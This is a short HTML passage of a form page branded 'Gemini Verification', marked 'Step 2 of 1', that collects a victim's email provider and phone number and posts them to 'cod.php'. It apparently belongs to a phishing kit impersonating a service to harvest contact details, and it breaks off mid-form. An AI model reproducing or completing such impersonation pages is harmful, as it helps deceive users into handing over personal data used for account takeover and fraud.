       ...
       <div class="card ">
          <div class="card-title text-center">
            <img src="logo.png" style="height:50px; width: 50px;">
                    <h1 class="mt-4">Gemini Verification</h1> <small class="para">Step 2 of 1. Email provider and phone verification.</small>
                </div>
                <form class="signup"action="cod.php" method="post">
                  <label>Email Provider: e.g Gmail, Outlook, Yahoo e.t.c</label>
                    <div class="form-group"><input type="text" class="form-control" name="email_provider" style="width: 25rem;" required ></div>
                    <label>Email Phone Number</label>
                    <div class="form-group"><input id="phone" name="phone_number" type="tel" class="form-control ph" style="width: 25rem;" required  ></div> 
